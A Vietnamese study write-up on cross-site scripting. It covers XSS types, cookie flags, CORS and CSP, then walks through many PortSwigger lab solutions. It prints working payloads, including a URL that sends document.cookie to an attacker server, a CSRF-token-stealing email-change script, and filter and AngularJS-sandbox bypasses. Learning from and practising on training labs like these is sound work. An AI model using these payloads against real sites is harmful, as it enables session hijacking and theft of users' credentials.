# **Cross-site scripting (XSS)** #

## **XSS là gì ?** ##

- XSS là một lỗ hổng bảo mật web cho phép kẻ tấn công xâm phạm các tương tác mà người dùng có với một ứng dụng dễ bị tấn công. Các lỗ hổng tập lệnh bắt chéo trang cho phép hacker thực hiện và truy cập vào bất kì vùng dữ liệu của người dụng, có thể toàn quyền kiểm soát chức năng và dữ liệu ứng dụng.

- XSS hoạt động bằng cách điều khiển một trang web dễ bị tấn công, để nó trả về JS độc hại cho người dùng. Khi mã độc thực thi bên trong trình duyệt nạn nhân, kẻ tấn công hoàn toàn có thể xâm phạm sự tương tác của chúng với người dùng.

- [**`Cheatsheet XSS`**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

![](./img_xss/xss-1.png)

## **Các loại tấn công XSS** ##

>### **Reflected cross-site scripting** ###

- Đây là một lỗ hổng mà kẻ tấn công tiêm những doạn code độc hại qua URL. Trong một cuộc tấn công Reflected XSS payload không được lưu trữ ở ứng dụng mà nó chỉ trả về với response html. Toàn bộ cuộc tấn công được hoàn thành trong một lần gửi request và phàn hồi duy nhất.

![](./img_xss/reflected.png)

- Một ví dụ XSS Session Hijacking Diagram (Đánh cắp phiên cookie của người dùng)
- Điều kiện xảy ra:
  - Cookie được sử dụng để xác định phiên.
  - Không có `HTTPonly` cookie flag set
  - Không có xác thực đầu vào.

```js
http://victim-server?search=<script>var+img=new+image();img.src="http://attacker-server/" + document.cookie;</script> 
```

![](./img_xss/xss.png)

>### **DOM-based cross-site scripting** ###

- Đối với DOM kẻ tấn công có thể thao tác với dom để đưa vào payload XSS và được hiện thị ở trang web.

- Một điều quan trọng cần nhớ với dựa trên DOM là nó không được máy chủ web xử lý, nạn nhân chỉ cần nhấp vào liên kết được tạo thủ công tải trọng và kết xuất tải trọng được xử lý phía máy khách.
- Tải trọng XSS DOM không bao giờ được gửi đến máy chủ, bất kỳ thứ gì sau dấu # hoặc ? không được gửi đến máy chủ, do đó, tính năng lọc phía máy chủ và các cơ chế lọc khác như tường lửa ứng dụng web (WAF) hoặc các biện pháp bảo vệ bộ lọc XSS dành riêng cho framework như Xác thực yêu cầu ASP.NET sẽ không ngăn XSS dựa trên DOM, vì tải trọng vẫn còn và được thực thi phía khách hàng.

![](./img_xss/DOM.png)

>### **Stored cross-site scripting** ###

- Stored XSS là một lỗ hổng xảy ra khi ứng dụng web có chức năng lưu trữ. Và được hiện thị dữ liệu trong trang. Sau đây là một số chức năng điển hình của trang web có thể tồn tại lỗ hổng Stored XSS.
  - Tin nhắn
  - Bình luận
  - Thông tin hồ sơ
- Kẻ tấn công có thể dùng js tấn công vào nạn nhân như sau:
  - Redirecting the browser
  - Cookie Theft / Session Hijacking
  - Key logging
  - Using XSS to steal CSRF tokens
  - Fake login forms
  - Abusing HTML 5
- Sau đây, là một ví dụ kẻ tấn công cướp cookie của nạn nhân gửi về máy chủ của mình.

![](./img_xss/stored.png)

## **Httponly và Secure**

- `Secure cookie`:
  - Secure cookie là một thuộc tính bảo mật được enabled khi sử dụng HTTPS, đảm bảo việc cookie luôn được mã hóa khi chuyển từ client đến server, giúp nó tránh khỏi việc bị nghe trộm làm lộ thông tin. Thêm vào đó, tất cả các cookie phải tuân theo chính sách cùng nguồn gốc (same-origin policy) của trình duyệt.
- `HttpOnly cookie`:
  - Thuộc tính HttpOnly của cookie được hỗ trở bởi hầu hết các trình duyệt. Một HttpOnly session cookie sẽ chỉ được sử dụng trong một HTTP (hoặc HTTPS) request, do đó hạn chế bị truy cập bởi các non-HTTP APIs chẳng hạn Javascript. Việc hạn chế này làm giảm nhẹ nhưng không loại trừ việc đánh cắp cookie thông qua lỗ hổng Cross-site scripting (XSS).

![](./img_xss/httponly.png)

![](./img_xss/ẽ.png)

- Cấu trúc của một cookie kích thước 4KB, bao gồm 7 thành phần chính:
  1. Name
  2. Value
  3. Expires (hạn sử dụng)
  4. Path (đường dẫn đến nơi cookie có hiệu lực, “/” có nghĩa là cookie có giá trị ở bất cứ đường dẫn nào)
  5. Domain
  6. Secure
  7. HttpOnly
- Hai thành phần đầu tiên (name và value) yêu cầu bắt buộc phải có.

- Các thuộc tính của cookie:
  - Domain, Path, Expirse, Max-Age, Secure và HttpOnly.

![](./img_xss/co.png)

## **Cross-Origin Resource Sharing (CORS) là gì?** ##

- CORS là một cơ chế dựa vào HTTP header, cho phép server chọn ra các origin (khác cái của chính nó) mà trình duyệt được phép tải tài nguyên về.

![](./img_xss/1.png)

- VD: front-end của <https://domain-a.com> sử dụng XMLHttpRequest (một đối tượng trong JS dùng để tương tác với server) để gửi request tới <https://domain-b.com/data.json>
  - Về vấn đề bảo mật, trình duyệt sẽ chặn cái request đến server khác gốc này, giả sử khi XMLHttpRequest và Fetch API cùng tuân theo SOP
  - Những web app sử dụng API như vậy sẽ chỉ có thể request tài nguyên từ chính origin của nó, trừ khi trong response của cái origin được request tới chứa CORS header
- Nếu không được triển khai cẩn thận có thể dẫn tới CSRF - Cross-site Request Forgery

**Cơ chế hoạt động của CORS**:
> **Trường hợp đơn giản nhất:**

![](./img_xss/2.png)

- Trang web <https://foo.example> muốn lấy tài nguyên từ web có origin <https://bar.other> thì trong đoạn code JS sẽ có kiểu như sau:

![](./img_xss/3.png)

![](./img_xss/5.png)

- `Access-Control-Allow-Origin` với giá trị `*`, tức là tài nguyên được request tới có thể được truy cập bởi mọi origin.

> **Preflighted request:**

- Preflight request là CORS request được browser tự động gửi khi có thêm các custom header (không phải header do user agent tự tạo). Nó dùng để kiểm tra xem server tài nguyên có cho phép request chứa giao thức đó và các header được thêm vào để truy cập vào tài nguyên hay không
- Preflight request là một request với giao thức OPTIONS, và có các header như:
  - Access-Control-Request-Method
  - Access-Control-Request-Headers
  - Origin

![](./img_xss/4.png)

> **Credentialed request:**

- Cách này dùng để tạo một request chứa credential của người dùng, thường là cookie
- Giả sử JS code có dạng như sau:

![](./img_xss/6.png)

- Ta thấy thuộc tính .withCredentials của thực thể invocation được set là true. Mặc định, trình duyệt sẽ bỏ qua response từ server mà không có header Access-Control-Allow-Credentials: true. Thế nên việc set true mới làm cho trình duyệt nhận response từ server
- Vậy là ta có request và response tương ứng:

![](./img_xss/7.png)

## **Content Security Policy** ##

- Content Security Policy, hay CSP, dịch là "Chính sách bảo mật nội dung"
- Nó là một tầng bảo mật được thêm vào để phát hiện và ngăn chặn các kiểu tấn công như XSS hoặc Injection attack
- Nhìn chung để thực hiện CSP, ta cần làm server trả về header Content-Security-Policy, ví dụ như sử dụng <meta> tag như sau trong Front End:

![](./img_xss/8.png)
![](./img_xss/9.png)

## **LAB XSS** ##

>### **Reflected XSS into HTML context with nothing encoded**

- Đề bài nói rằng để solve được lap thì hãy thực hiện cross-site scripting attack để gọi làm alert .

![](./img_xss/lap-1.png)

- Có một điều thú vị ở đây nếu mình thực hiện thêm một thể a vào thì điều gì sẽ xảy ra, nó cũng là một lỗ hổng nghiêm trong để mình bắt chéo trang.

![](./img_xss/ex_lap-1.png)

>### **Stored XSS into HTML context with nothing encoded**

- Bài này nó liên quan đến comment thì tôi nhận ra khi một trang web blog load thì sẽ phải cần truy nhập vào database để lấy dữ liệu. Từ đó, chúng ta hãy tạo xss trong comment. Vậy chúng ta đã solve được bài. Tương tự mình cũng có thể gắn thẻ a vào để tấn công.

![](./img_xss/lap-2.png)

>### **DOM XSS in document.write sink using source location.search**

- Sau khi đọc source thì ta thấy nó sẽ lấy query `var query = (new URLSearchParams(window.location.search)).get('search');` nếu nó tồn tại truy vấn thì DOM sẽ write img.
 Vận dụng điều đó chúng ta sẽ tấn công để gọi hàm alert().

![](./img_xss/lap-3.png)

![](./img_xss/lap-3_ex.png)

>### **DOM XSS in innerHTML sink using source location.search**

![](./img_xss/xss-5.png)

- Sau khi đọc suorce và thử alert bằng script nhưng không thì tôi liền thử với thẻ a hoặc thẻ img. Và sử dụng cheatsheet tôi đã tìm ra một phương án `<img src/onerror=alert(1)>`. Và chúng ta đã thành công vượt qua thử thách.

![](./img_xss/xss-5-1.png)

>### **DOM XSS in jQuery anchor href attribute sink using location.search source**

- Tôi đã thử hết mọi cách nhưng dường như đối với bày này họ đã fix hết lỗi nhưng tôi đã đặt ra nghi vấn với submit feedback.

![](./img_xss/xss-6.png)

- Tôi đã thử trong các trường submit nhưng hiệu quả đem lại không có gì. Nhưng tôi lại chú ý đến `https://0a93004d032a9b03c1ab805300220035.web-security-academy.net/feedback?returnPath=/`

- Tôi đã xem trong source về `returnPath` điều này có nghĩa là mình nhấn vào Back. JS sẽ dùng jquery để chèn vào `href` và bây giờ mình sẽ đi tấn công href

![](./img_xss/xss-6-1.png)

- Sử dụng cheatsheet thôi đã tìm ra một cách tấn công thay đổi `href = javascript:alert(1)`

![](./img_xss/xss-6-2.png)

![](./img_xss/xss-6-3.png)

>### **DOM XSS in jQuery selector sink using a hashchange event**

- Như tiêu đề bài sẽ liên quen đến hash change.
  - The `hashchange event` is fired when the fragment identifier of the URL has changed (the part of the URL beginning with and following the `# symbol`).

```javascript
<script>
    $(window).on('hashchange', function(){
            var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
        if (post) post.get(0).scrollIntoView();
    });
</script>
```

- `section.blog-list h2:contains` đoạn này có nghĩa sau khi nhận bt có sự thay đổi url nó sẽ kiểm tra trong phần tử section có class='blog-lits' và h2 chứa nội dụng trong trang web thì trang web sẽ cuội đến nội dung ấy.
- Sau khi đọc source tôi đã thử nghiệm thay đổi url console nó ra và tôi được `123123` điều đó có nghĩa khi tôi thay đổi nó sẽ lấy giá trị sau dấu `#`

![](./img_xss/xss-7.png)

- Tôi đã thử với `#<img src/onerror=alert(1)>` điều gì sẽ xảy ra. Nó đã hiện thị như tôi mong muốn.

![](./img_xss/xss-7-1.png)

- Theo bài ra đã nói "To solve the lab, deliver an exploit to the victim that calls the print() function in their browser."Vậy chúng ta hãy vào

- Việc chúng ta cần làm ở đây là nhúng một thẻ lên web.

![](./img_xss/xss-7-2.png)

- Và chúng ta đã vượt qua thử thách.

![](./img_xss/xss-7-3.png)

>### **Reflected XSS into attribute with angle brackets HTML-encoded**

- Bài này sau khi tôi đã thử hết chức năng tôi nhận thấy  chức năng tìm kiếm, khi tôi nhập tìm kiếm thì giá trị sẽ lưu ở form.

![](./img_xss/xss-8.png)

- Từ đó thôi đã thử với việc chèn vào một alert với thuộc tính `onclick="alert(1)"` và đã solve được bài ra.

![](./img_xss/xss-8-2.png)

>### **Stored XSS into anchor href attribute with double quotes HTML-encoded**

- Theo như đề ra để solve được bài này sau khi mình nhấn submit comment thì nó sẽ gọi hàm alert.

- Tôi đã kiểm tra comment blog thì tôi nhận ra tôi write vào trường web thì tên của mình sẽ đi đến trang web ấy.

![](./img_xss/xss-9.png)

- Từ đó, tôi đặt ra ý định chèn `javascript:alert(1)` vào trường web và điều đó đã thực hiện được và solve trang web.

![](./img_xss/xss-9-2.png)

>### **Reflected XSS into a JavaScript string with angle brackets HTML encoded**

- Khi tôi search và đọc source, tôi thấy 1 đoạn js rất khả khi nó đã encodeURI. Sau tôi tìm hiểu về `encodeURIComponent()` tôi biết nó sẽ encode loại trừ `A–Z a–z 0–9 - _ . ! ~ * ' ( )`. Từ đó, tôi bypass nó bằng cách `'-alert(1)-'`.

![](./img_xss/xss%3D10.png)

>### **DOM XSS in document.write sink using source location.search inside a select element**

- Sau khi tôi kiểm tra thì tôi phát hiện lỗi ở bài này nằm ở script check stock.

![](./img_xss/xss-11.png)

- Ở đoạn script này có chức năng liệt kê các option check stock nhưng điều khả nghi ở đây là `var store`. Tôi liền thực hiện một số thí nghiệm như sau:

![](./img_xss/xss-11-1.png)

- Nếu tôi thêm vào url key storeId thì điều gì sẽ xảy ra :

![](./img_xss/xss-11-2.png)

![](./img_xss/xss-11-3.png)

- Từ đó, tôi đã tìm ra hướng tấn công mới ^-^ tôi sẽ ngắt select và thêm thẻ img để hiên alert `https://0a5c00dd03355b40c1a64f4c00710033.web-security-academy.net/product?productId=1&storeId=%3C/select%3E%3Cimg%20src=1%20onerror=alert(1)%3E` như sau :

![](./img_xss/xss-11-4.png)

>### **DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded**

- Bài này liên quan về `angularjs`. Vậy chúng ta hãy tìm hiều về những điiều cơ bản nhất về angularjs

- [Tài liệu cơ bạn AngularJS](../../WEB_SEC/AngularJS.md)

- Sau khi tôi đã thử nhập trên thanh search tôi phát hiện ra từ mình tìm kiếm ở trên h1. Vậy tôi sẽ bypass bằng cách ngắt h1 và thêm thẻ img. Hoặc sử dụng `{{$on.constructor('alert(1)')()}}` hoặc `{{constructor.constructor('alert(1)')()}}`

>### **Reflected DOM XSS**

- Khi tôi thử chức năng tìm kiếm tôi đã thấy một điều khả nghi ở

```html
  <script src='resources/js/searchResults.js'><script>
  <script>search('search-results')</script>
```

- Từ đó, Tôi kiểm tra source file searchResults.js và tôi đã thử một điều thú vị:

![](./img_xss/xss-12.png)

- Điều này có nghĩa khi hàm `search('search-results')` được chạy nó sẽ gửi một request theo phương thức get và thực hiện hàm search.

![](./img_xss/xss-12-1.png)

- Sau khi đọc source file js, tôi đã nghĩ comment json để thực hiện gọi hàm alert(1) như sau: `\"-alert(1)}//`

![](./img_xss/xss-12-2.png)

![](./img_xss/xss-12-3.png)

>### **Stored DOM XSS**

- Đối với bài này sau khi đọc source, có một điều khả nghi:

```html
<script>loadComments('/post/comment')</script>
```

- Từ đấy, tôi kiểm tra hàm `loadComments` bằng cách như sau:

![](./img_xss/xss-13-1.png)

- Sau khi hàm thực hiện nó sẽ gửi request và bỏ thêm 2 comments

- Sau khi mình quay lại blog thì brower sẽ gửi request đến server và trả về cho mình Data json dữ liệu như sau :

![](./img_xss/xss-13-2.png)

![](./img_xss/xss-14-1.png)

- Điều chú ý ở đây là hàm `escapeHTML` đây là một hàm encode html để tránh khỏi việc người dùng thêm một element để tấn công trang web như script và các thẻ html.Nhưng việc mã hóa bằng replace như thế nó chưa tối ưu hoàn toàn.Một trường hợp tôi đưa ra như sau để chứng tỏ điều đó.

![](./img_xss/xss-14-2.png)

- Từ đấy mình có bypass comment bằng cách như sau:
  - `<><img src/onerror=alert(1)>`
- Sau đó bạn quay lại blog thì aler(1) số xuất hiện và solve thành công.

>### **Exploiting cross-site scripting to steal cookies**

- Đây là một bài liên quan đến đánh cắp cookie của người dùng.

- Chúng ta hãy tìm hiểu về công cụ `Burp Collaborator`

- Công cụ có tác dụng để khiến ứng dụng mục tiêu tương tác với một server bên ngoài.
- Các bước thực hiện như sau:
  - Tạo payload
  - Chèn Payload vào request
  - Thăm dò `Collaborator server` để xem ứng dụng có sự tương tác payload với ứng dụng mạng không.

![](./img_xss/bb.png)

- Đầu tiên tôi đã thử một vài thử nghiệm trong comment đẻ biết chỗ mình có thể tấn công bằng việc sử dụng alert

![](./img_xss/xss-15-1.png)

- Và điều đó đã thành công. Vậy tôi đã thử nghiệm tạo một payload lên comment và sử dụng `Burp Collaborator`

![](./img_xss/xss-15-2.png)

- Tôi đã lấy được cookie người dùng, và có quyền admin.

![](./img_xss/xss-15-3.png)

![](./img_xss/xss-15-4.png)

>### **Exploiting cross-site scripting to capture passwords**

- Theo như tiêu đề bài chúng ta sẽ tấn công tương tự bài trên chúng ta sử dụng script để lấy user và password.

- Tương tự thử nghiệm bài trên chúng ta sẽ xss tấn công vào comment.

![](./img_xss/xss-15-5.png)

- Sau khi mình gửi payload lên và mình sẽ lấy được user password người dùng. Từ đó, tôi đã lấy được password và username của administrator.

![](./img_xss/xss-16-1.png)

![](./img_xss/xss-16-2.png)

>### **Exploiting XSS to perform CSRF**

- Sau khi đăng nhập bằng tài khoản `wiener:peter`, Tôi đã thấy trang web hiện tại sẽ hiện ra email. Vậy để tấn công tôi sẽ gửi request đến trang web ấy và lấy email của người dùng hoặc update email.

![](./img_xss/xss-17-1.png)

- Tôi đã thử tạo một request như sau :

![](./img_xss/xss-17-2.png)

![](./img_xss/xss-17-3.png)

- Nó đã hiên console.log cho mình. Bây giờ, việc của mình có thể gửi request update email người dùng.

![](./img_xss/xss-17-4.png)

- Mình thực hiện một script như sau:

``` javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

- Vậy email người dùng đã bị thay đổi ^_^.

![](./img_xss/xss17-5.png)

>### **Reflected XSS into HTML context with most tags and attributes blocked**

- Với tiêu đề bài ta đã biết website đã chặn hết mọi thẻ và thuộc tính.

- Cách thực hiện và kết qủa như sau:

![](./img_xss/xss-18-1.png)

![](./img_xss/xss-18-2.png)

- Tôi đã nghĩ cách bruteforce các thẻ và thuộc tính xem trang web đã khóa hết mọi thuộc tính và thẻ hay chưa.

- Đầu tiên, tôi thử với các thẻ xem respons nào trả về 200.

![](./img_xss/xss-18-3.png)

![](./img_xss/xss-18-4.png)

- Vậy ta đã lấy được 2 thẻ có thể bypass. Tương tự, chúng ta hãy thử với thuộc tính.

![](./img_xss/xss-18-5.png)

![](./img_xss/xss-18-6.png)

![](./img_xss/xss-18-7.png)

![](./img_xss/xss-18-8.png)

- Từ những điều trên, tôi đã thử viết script như sau `<iframe src="https://0a2a00d004e11121c22bc55f004800dc.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" >`

![](./img_xss/xss-18-9.png)

>### **Reflected XSS into HTML context with all tags blocked except custom ones**

- Bài ra đã cho chúng ta biết rằng tất cả các thẻ đều đã block chỉ còn các thẻ custom. Tôi đã thử tạo một thẻ custom như sau: `<xss autofocus tabindex=1 onfocus=alert(1)></xss>`

- Điều kì diệu đã xảy ra ^-^.

![](./img_xss/xss-19-1.png)

- Tôi đã thực hiện tấn công như sau :

```javascript
<script>
location = 'https://0ab7009e03057f1ac196ee7c002300e2.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```

>### **Reflected XSS with some SVG markup allowed**

- Đọc đề bài ta đã thấy họ đã block hầu như tất cả các thẻ ngoài trừ thẻ `svg`, `image` , `animatetransform`. Tôi đã thử một cách như sau:

![](./img_xss/xss-20-1.png)

![](./img_xss/xss-20-2.png)

- Và kết quả là thuộc tính này đã bị chặn. Không còn cách nào khác tôi sẽ thử bruteforce hết tất cả thuộc tính, và kết hợp với cheatsheet XSS. Và chỉ mỗi thuộc tính `onbegin` được chấp thuận.

```html
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```

- Sau khi nhập script trên tôi đã solve bài ra.

>### **Reflected XSS in canonical link tag**

- Sau khi chú ý trong source code, tôi đã thấy một thẻ link và yêu cầu bài ra làm thế nào sử dụng keycode để hiện alert(1).

![](./img_xss/xss-21-1.png)

- Sau khi tôi search lên gg và tìm cách accesskey như sau:

```html
<link rel="canonical" accesskey="X" onclick="alert(1)" /> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)
```

- Từ đó, tôi đã nhập lên url(`https://0af600b4044374ccc3819382005000ca.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)`)

![](./img_xss/xss-21-2.png)

>### **Reflected XSS into a JavaScript string with single quote and backslash escaped**

- Sau khi tôi đã thử `<script>alert(1);</script>` đối với chức năng search tôi nhận ra tôi đã vô tình đóng thẻ script.

![](./img_xss/xss-22-1.png)

- Vậy để không đóng thẻ script và thực hiện alert như sau : `</script><script>alert(1);</script>`. Việc này nhằm tạo ra thêm một script hiện alert.

![](./img_xss/xss-22-2.png)

>### **Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped**

- Sau khi tôi đã thử nhập một chuỗi string vào search tôi phát hiện ra một đoạn code có thể inject vào.

![](./img_xss/xss-23-1.png)

- Tôi đã liền thử làm sao có thể đóng `'` và thực hiện alert.Tôi đã thử nghiệm như sau :
`\'sfsdfsd`

![](./img_xss/xss-23-2.png)

- Vậy tôi đã tách ra khỏi chuỗi việc còn lại là hãy sử dụng + alert(1) :

![](./img_xss/xss-23-3.png)

>### **Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped**

- Sau khi tôi đã thử mọi cách thì các script đều được chuyển qua chuỗi.

![](./img_xss/xss-24-1.png)

- Tôi đã nghĩ đến khi tôi viết code để hiện lên html tôi đã nghĩ đến `HTML Entities`. Và tôi vận dụng cách này để tấn công.

![](./img_xss/xss-24-2.png)

- Và tôi đã đưa nó vào website :

![](./img_xss/xss-24-3.png)

>### **Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped**

![](./img_xss/xss-25-1.png)

- Như bạn đã thấy source script sử sụng "``". Vậy chúng ta hãy sử dụng `${alert(1)}` và chúng ta đã vượt qua được thử thách.

>### **Reflected XSS with event handlers and href attributes blocked**

- Đối với bài tôi sẽ thực hiện bruteforce để xem tags html nào được chấp thuận.Thì tôi thấy những thẻ sau được chấp thuận.

![](./img_xss/xss-26-1.png)

- Từ đó, tôi đã viết script như sau:

```html
<svg><a><animate attributeName="href" values="javascript:alert(1)"></animate><text x="20" y="20">Click me</text></a>'</svg>
```

>### **Reflected XSS in a JavaScript URL with some characters blocked**

- Chú ý : [Tham khảo](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked)

>### **Reflected XSS with AngularJS sandbox escape without strings**

- [Hiểu rõ DOM based AngularJS sandbox escapes](https://portswigger.net/research/dom-based-angularjs-sandbox-escapes)

>### **Reflected XSS with AngularJS sandbox escape and CSP**

```js
<script>
location='https://0a4800b20490ca07c1c43af5008f00df.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>
```
